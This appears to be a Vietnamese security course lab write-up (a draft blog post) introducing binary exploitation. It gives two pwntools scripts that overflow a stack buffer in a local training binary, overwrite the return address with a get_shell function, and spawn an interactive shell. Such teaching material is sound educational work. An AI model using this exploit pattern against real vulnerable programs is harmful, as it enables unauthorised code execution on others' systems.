---
date:
  created: 2025-10-31
  updated: 2025-10-31
categories:
  - lab
  - programing security
tags:
  - lab
authors:
  - vuongdat67
readtime: 
draft: true
---

# Lab 3: Nhập môn Pwnable

<!-- more -->


## Code bai 1

??? note "Code Bài 1"

    === "short"

        ``` python
        from pwn import *
            exe = './app1-no-canary'
            get_shell = 0x0804872b   # THAY bằng địa chỉ thực
            offset = 28
            payload = b"A"*offset + p32(get_shell)

            p = process(exe)
            p.sendline(payload)
            p.interactive()
        ```

    === "Long"

        ``` python title="exploit-app1" linenums="1"
        #!/usr/bin/env python3
        from pwn import *
        import sys
        context.binary = ELF('./app1-no-canary')
        context.log_level = 'info'

        exe = './app1-no-canary'
        offset = 28

        # Lấy địa chỉ get_shell từ ELF nếu có symbol
        if hasattr(context.binary, 'symbols') and 'get_shell' in context.binary.symbols:
            get_shell = context.binary.symbols['get_shell']
        else:
            # Thay bằng địa chỉ bạn đã tìm (vd 0x0804872b)
            get_shell = 0x0804872b

        payload = b'A'*offset + p32(get_shell)

        # Khởi tạo process
        p = process(exe)

        # cố gắng nhận prompt một cách an toàn
        try:
            p.recvuntil(b'Password:', timeout=1.5)
        except EOFError:
            log.warning("EOF before prompt")
        except Exception:
            # nếu không nhận được prompt kịp, vẫn gửi payload (fallback)
            log.info("Timeout waiting for prompt, sending anyway")

        log.info(f"Sending payload (len={len(payload)}) -> get_shell@{hex(get_shell)}")
        p.sendline(payload)

        # Đợi 1 chút để chương trình in (ví dụ "Invalid Password!" hoặc "Call get_shell")
        sleep(0.2)

        # Tạo TTY cho shell nếu có
        try:
            p.sendline(b'python3 -c "import pty; pty.spawn(\\\"/bin/sh\\\")"')
            # Nếu python3 không tồn tại trong target, fallback sang /bin/sh thẳng
        except Exception:
            pass

        p.interactive()
        ```

???+ success "Kết quả"

    === "Short"

        ![Short](Short.png)

    === "Long"

        ![Long](Long.png)






    


